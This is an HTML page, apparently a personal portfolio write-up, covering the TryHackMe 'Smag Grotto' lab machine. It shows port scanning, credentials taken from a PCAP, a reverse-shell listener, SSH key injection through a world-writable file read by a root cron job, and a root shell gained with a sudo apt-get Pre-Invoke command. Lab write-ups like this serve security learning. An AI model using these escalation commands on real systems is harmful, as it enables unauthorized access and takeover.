@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smag Grotto — TryHackMe Writeup | Oussama Zehri</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #ff003c;
+            --green: #00ff9f;
+            --bg: #000000;
+            --bg-card: #060606;
+            --border: #111111;
+            --text: #cfcfcf;
+            --text-dim: #888;
+            --text-faint: #555;
+        }
+
+        *, *::before, *::after { box-sizing: border-box; }
+
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: "JetBrains Mono", monospace;
+            font-size: 0.9rem;
+            line-height: 1.8;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(ellipse at 50% 0%, rgba(255,0,60,0.07), transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        nav {
+            position: relative;
+            z-index: 1;
+            padding: 18px 40px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        nav a { color: var(--text-dim); text-decoration: none; font-size: 0.8rem; transition: color 0.15s; }
+        nav a:hover { color: var(--green); }
+        nav .sep { color: var(--text-faint); }
+        nav .current { color: var(--red); }
+
+        header {
+            position: relative;
+            z-index: 1;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 50px 24px 30px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .badge-row { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+
+        .badge {
+            font-size: 0.72rem;
+            padding: 3px 10px;
+            border: 1px solid var(--border);
+            color: var(--text-dim);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .badge.red   { border-color: var(--red);   color: var(--red); }
+        .badge.green { border-color: var(--green);  color: var(--green); }
+
+        header h1 { color: var(--red); font-size: 2rem; margin: 0 0 14px; letter-spacing: 2px; }
+
+        .meta { color: var(--text-dim); font-size: 0.8rem; display: flex; flex-wrap: wrap; gap: 20px; }
+        .meta span { color: var(--text); }
+
+        .toc {
+            position: relative;
+            z-index: 1;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 30px 24px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .toc h2 { color: var(--red); font-size: 0.85rem; letter-spacing: 2px; margin-bottom: 14px; }
+
+        .toc ol {
+            margin: 0;
+            padding-left: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 4px 30px;
+        }
+
+        .toc li { padding: 2px 0; }
+        .toc a { color: var(--text-dim); text-decoration: none; font-size: 0.82rem; transition: color 0.15s; }
+        .toc a:hover { color: var(--green); }
+
+        main {
+            position: relative;
+            z-index: 1;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 0 24px 60px;
+        }
+
+        .section { padding: 40px 0; border-bottom: 1px solid var(--border); }
+        .section:last-child { border-bottom: none; }
+
+        .section-title {
+            color: var(--red);
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin: 0 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-title::after { content: ""; flex: 1; height: 1px; background: var(--border); }
+        .section-title .icon { color: var(--green); }
+
+        h3 { color: var(--green); font-size: 0.88rem; margin: 24px 0 10px; }
+
+        p { margin: 0 0 14px; color: var(--text); }
+
+        .callout {
+            border-left: 3px solid var(--red);
+            background: var(--bg-card);
+            padding: 14px 18px;
+            margin: 16px 0;
+            color: var(--text-dim);
+            font-size: 0.85rem;
+        }
+
+        .callout.green { border-left-color: var(--green); }
+
+        .code-block {
+            background: #050505;
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--red);
+            padding: 0;
+            margin: 16px 0;
+            overflow: hidden;
+        }
+
+        .code-block .code-header {
+            background: #0a0a0a;
+            border-bottom: 1px solid var(--border);
+            padding: 6px 16px;
+            font-size: 0.72rem;
+            color: var(--text-faint);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .code-block .code-header .lang { color: var(--red); }
+
+        .code-block pre { margin: 0; padding: 16px; overflow-x: auto; }
+
+        .code-block code {
+            color: var(--green);
+            font-family: "JetBrains Mono", monospace;
+            font-size: 0.85rem;
+            line-height: 1.7;
+        }
+
+        p code, li code {
+            background: #0a0a0a;
+            color: var(--green);
+            padding: 1px 6px;
+            border: 1px solid var(--border);
+            font-size: 0.82rem;
+        }
+
+        .table-wrap { overflow-x: auto; margin: 16px 0; }
+
+        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+        thead tr { border-bottom: 2px solid var(--red); }
+        tbody tr { border-bottom: 1px solid var(--border); }
+        tbody tr:hover { background: var(--bg-card); }
+        th { color: var(--red); text-align: left; padding: 10px 14px; font-weight: 600; letter-spacing: 1px; font-size: 0.78rem; text-transform: uppercase; }
+        td { padding: 10px 14px; color: var(--text); }
+        td:first-child { color: var(--green); font-weight: 600; }
+
+        ul, ol { padding-left: 20px; margin: 10px 0; }
+        li { margin-bottom: 6px; }
+
+        .chain { display: flex; flex-direction: column; align-items: flex-start; gap: 0; margin: 20px 0; }
+
+        .chain-step {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--red);
+            padding: 10px 18px;
+            font-size: 0.85rem;
+            color: var(--text);
+            width: 100%;
+            max-width: 460px;
+        }
+
+        .chain-arrow { color: var(--red); padding: 2px 22px; font-size: 1rem; }
+
+        .lessons-list { list-style: none; padding: 0; margin: 0; }
+        .lessons-list li { padding: 8px 0; border-bottom: 1px solid var(--border); color: var(--text); display: flex; gap: 10px; }
+        .lessons-list li::before { content: "✔"; color: var(--green); flex-shrink: 0; }
+
+        footer {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 30px;
+            color: var(--text-faint);
+            font-size: 0.78rem;
+            border-top: 1px solid var(--border);
+        }
+
+        footer a { color: var(--green); text-decoration: none; }
+        footer a:hover { color: var(--red); }
+
+        @media (max-width: 600px) {
+            header h1 { font-size: 1.4rem; }
+            nav { padding: 14px 16px; }
+            main, header, .toc { padding-left: 16px; padding-right: 16px; }
+            .toc ol { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <a href="../../index.html">~/oussama</a>
+    <span class="sep">/</span>
+    <a href="../../index.html#writeups">writeups</a>
+    <span class="sep">/</span>
+    <span class="current">smag-grotto</span>
+</nav>
+
+<header>
+    <div class="badge-row">
+        <span class="badge red">TryHackMe</span>
+        <span class="badge">Easy</span>
+        <span class="badge">PCAP Analysis</span>
+        <span class="badge">Cron Exploitation</span>
+        <span class="badge">Sudo Misconfiguration</span>
+        <span class="badge green">Rooted ✅</span>
+    </div>
+    <h1>Smag Grotto</h1>
+    <div class="meta">
+        Target: <span>10.112.173.22</span> &nbsp;·&nbsp; Goal: <span>User → Root</span>
+    </div>
+</header>
+
+<div class="toc">
+    <h2>// Table of Contents</h2>
+    <ol>
+        <li><a href="#recon">Recon & Port Scanning</a></li>
+        <li><a href="#web">Web Enumeration</a></li>
+        <li><a href="#pcap">PCAP Analysis</a></li>
+        <li><a href="#hosts">Updating Hosts File</a></li>
+        <li><a href="#login">Web Login</a></li>
+        <li><a href="#shell">Reverse Shell</a></li>
+        <li><a href="#stable">Stabilizing Shell</a></li>
+        <li><a href="#jake">PrivEsc → Jake</a></li>
+        <li><a href="#sshkey">Injecting SSH Key</a></li>
+        <li><a href="#root">PrivEsc → Root</a></li>
+        <li><a href="#chain">Attack Chain</a></li>
+        <li><a href="#lessons">Key Takeaways</a></li>
+    </ol>
+</div>
+
+<main>
+
+    <!-- RECON -->
+    <div class="section" id="recon">
+        <h2 class="section-title"><span class="icon">01</span> Recon & Port Scanning</h2>
+        <p>Fast full-port scan with service detection using Rustscan:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Full Port Scan</span></div>
+            <pre><code>rustscan -a 10.112.173.22 --ulimit 5000 -r 1-65535 -- -sV -sC -Pn</code></pre>
+        </div>
+        <h3>📡 Open Ports</h3>
+        <div class="table-wrap">
+            <table>
+                <thead><tr><th>Port</th><th>Service</th><th>Notes</th></tr></thead>
+                <tbody>
+                    <tr><td>22</td><td>SSH</td><td>Exposed — no creds yet</td></tr>
+                    <tr><td>80</td><td>HTTP</td><td>Best initial attack vector</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="callout">SSH is exposed but without credentials it's not immediately useful. Port 80 is the primary attack surface.</div>
+    </div>
+
+    <!-- WEB ENUM -->
+    <div class="section" id="web">
+        <h2 class="section-title"><span class="icon">02</span> Web Enumeration</h2>
+        <p>Directory brute-forcing to uncover hidden paths:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Directory Brute-Force</span></div>
+            <pre><code>gobuster dir -u http://10.112.173.22 -w /usr/share/wordlists/dirb/common.txt -t 50</code></pre>
+        </div>
+        <h3>✅ Discovered</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">output</span><span>Found Directory</span></div>
+            <pre><code>/mail</code></pre>
+        </div>
+        <div class="callout green">That's where things start getting interesting.</div>
+    </div>
+
+    <!-- PCAP -->
+    <div class="section" id="pcap">
+        <h2 class="section-title"><span class="icon">03</span> PCAP Analysis</h2>
+        <p>Inside <code>/mail</code>, there was a downloadable PCAP file. Opened it in Wireshark.</p>
+        <p>The captured traffic revealed:</p>
+        <ul>
+            <li>A <strong style="color:#fff">username</strong></li>
+            <li>A <strong style="color:#fff">password</strong></li>
+            <li>A <strong style="color:#fff">subdomain</strong></li>
+        </ul>
+        <div class="callout green">
+            💡 Always analyze downloadable files. PCAPs frequently contain credentials transmitted in cleartext.
+        </div>
+    </div>
+
+    <!-- HOSTS -->
+    <div class="section" id="hosts">
+        <h2 class="section-title"><span class="icon">04</span> Updating Hosts File</h2>
+        <p>With the subdomain discovered, we update the local hosts file to resolve the domain correctly:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Edit Hosts File</span></div>
+            <pre><code>sudo nano /etc/hosts</code></pre>
+        </div>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">config</span><span>Add Entry</span></div>
+            <pre><code>10.112.173.22    smag.thm subdomain.smag.thm</code></pre>
+        </div>
+        <p>The application is now accessible properly via the discovered domain.</p>
+    </div>
+
+    <!-- LOGIN -->
+    <div class="section" id="login">
+        <h2 class="section-title"><span class="icon">05</span> Web Login</h2>
+        <p>Using credentials extracted from the PCAP capture:</p>
+        <ul>
+            <li>Login to web app → <strong style="color:var(--green)">Successful</strong></li>
+            <li>SSH with same credentials → <strong style="color:var(--red)">Failed</strong></li>
+        </ul>
+        <div class="callout">Credential reuse didn't work for SSH — the intended path is web exploitation.</div>
+    </div>
+
+    <!-- SHELL -->
+    <div class="section" id="shell">
+        <h2 class="section-title"><span class="icon">06</span> Reverse Shell</h2>
+        <p>After login, an input field was available for command execution. Tested multiple payloads and landed a BusyBox reverse shell.</p>
+        <p>Start listener on attacker machine:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Netcat Listener</span></div>
+            <pre><code>rlwrap nc -nvlp 443</code></pre>
+        </div>
+        <div class="callout green">Payload triggered → Reverse shell received ✔️</div>
+    </div>
+
+    <!-- STABLE -->
+    <div class="section" id="stable">
+        <h2 class="section-title"><span class="icon">07</span> Stabilizing the Shell</h2>
+        <p>Upgrade the dumb shell to a fully interactive TTY:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>TTY Upgrade</span></div>
+            <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+        </div>
+        <div class="callout green">Stable interactive shell obtained ✔️</div>
+    </div>
+
+    <!-- JAKE -->
+    <div class="section" id="jake">
+        <h2 class="section-title"><span class="icon">08</span> Privilege Escalation → Jake</h2>
+        <p>While enumerating the system, a suspicious cron job was discovered:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Check Crontab</span></div>
+            <pre><code>cat /etc/crontab</code></pre>
+        </div>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">output</span><span>Cron Entry</span></div>
+            <pre><code>* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys</code></pre>
+        </div>
+        <p>Every minute, root overwrites Jake's <code>authorized_keys</code> using the file at <code>/opt/.backups/jake_id_rsa.pub.backup</code>.</p>
+        <p>Checking the file permissions:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">output</span><span>File Permissions</span></div>
+            <pre><code>-rw-rw-rw- 1 root root jake_id_rsa.pub.backup</code></pre>
+        </div>
+        <div class="callout">
+            🚨 <strong style="color:#fff">World-writable</strong> file executed by root every minute — this is the escalation vector.
+        </div>
+    </div>
+
+    <!-- SSH KEY -->
+    <div class="section" id="sshkey">
+        <h2 class="section-title"><span class="icon">09</span> Injecting SSH Key</h2>
+        <p>Generate an RSA key pair on attacker machine:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Generate Key Pair</span></div>
+            <pre><code>ssh-keygen -t rsa -b 2048 -f mykey</code></pre>
+        </div>
+        <p>Display the public key:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Read Public Key</span></div>
+            <pre><code>cat mykey.pub</code></pre>
+        </div>
+        <p>Inject it into the world-writable backup file:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Overwrite Backup File</span></div>
+            <pre><code>echo "ssh-rsa AAAA...." > /opt/.backups/jake_id_rsa.pub.backup</code></pre>
+        </div>
+        <p>Wait one minute for the cron job to execute, then connect:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>SSH as Jake</span></div>
+            <pre><code>ssh -i mykey jake@10.112.173.22</code></pre>
+        </div>
+        <div class="callout green">User access obtained. User flag captured ✔️</div>
+    </div>
+
+    <!-- ROOT -->
+    <div class="section" id="root">
+        <h2 class="section-title"><span class="icon">10</span> Privilege Escalation → Root</h2>
+        <p>Check Jake's sudo privileges:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Check Sudo Rights</span></div>
+            <pre><code>sudo -l</code></pre>
+        </div>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">output</span><span>Sudo Entry</span></div>
+            <pre><code>(ALL : ALL) NOPASSWD: /usr/bin/apt-get</code></pre>
+        </div>
+        <p>Jake can run <code>apt-get</code> as root without a password. Exploit using the <code>Pre-Invoke</code> option:</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Root Shell via apt-get</span></div>
+            <pre><code>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code></pre>
+        </div>
+        <p>How it works: <code>apt-get</code> runs as root → <code>Pre-Invoke</code> executes <code>/bin/sh</code> → shell spawns with root privileges.</p>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>Verify</span></div>
+            <pre><code>whoami
+
+root</code></pre>
+        </div>
+        <div class="callout green">Root flag captured ✔️</div>
+    </div>
+
+    <!-- CHAIN -->
+    <div class="section" id="chain">
+        <h2 class="section-title"><span class="icon">11</span> Attack Chain</h2>
+        <div class="chain">
+            <div class="chain-step">Rustscan → Ports 22, 80 identified</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">Gobuster → /mail directory discovered</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">PCAP analysis → Credentials + subdomain extracted</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">/etc/hosts updated → Subdomain resolved</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">Web login → Reverse shell via input field</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">Cron misconfiguration → World-writable backup file</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">SSH key injection → Jake user shell</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step">sudo apt-get Pre-Invoke → Root shell</div>
+            <div class="chain-arrow">↓</div>
+            <div class="chain-step" style="border-left-color: var(--green); color: var(--green);">ROOT ACCESS ✅</div>
+        </div>
+    </div>
+
+    <!-- LESSONS -->
+    <div class="section" id="lessons">
+        <h2 class="section-title"><span class="icon">12</span> Key Takeaways</h2>
+        <ul class="lessons-list">
+            <li>Always analyze downloadable files — PCAPs can contain plaintext credentials.</li>
+            <li>Cron jobs are powerful escalation vectors, especially when they reference writable files.</li>
+            <li>World-writable files executed by root are critical misconfigurations.</li>
+            <li>Misconfigured sudo entries (like <code>apt-get</code>) often lead directly to root.</li>
+            <li>Enumeration is more important than fancy exploits — fundamentals win.</li>
+        </ul>
+        <div class="callout" style="margin-top: 28px;">
+            <strong style="color:#fff">Final Thought:</strong> Clean exploitation path. No zero-days needed.
+            Just <strong style="color:var(--red)">Misconfigured Cron + World-Writable File + Sudo Abuse</strong> = full compromise.
+        </div>
+    </div>
+
+</main>
+
+<footer>
+    <a href="../../index.html">← Back to Portfolio</a> &nbsp;·&nbsp; © 2026 Oussama Zehri
+</footer>
+
+</body>
+</html>
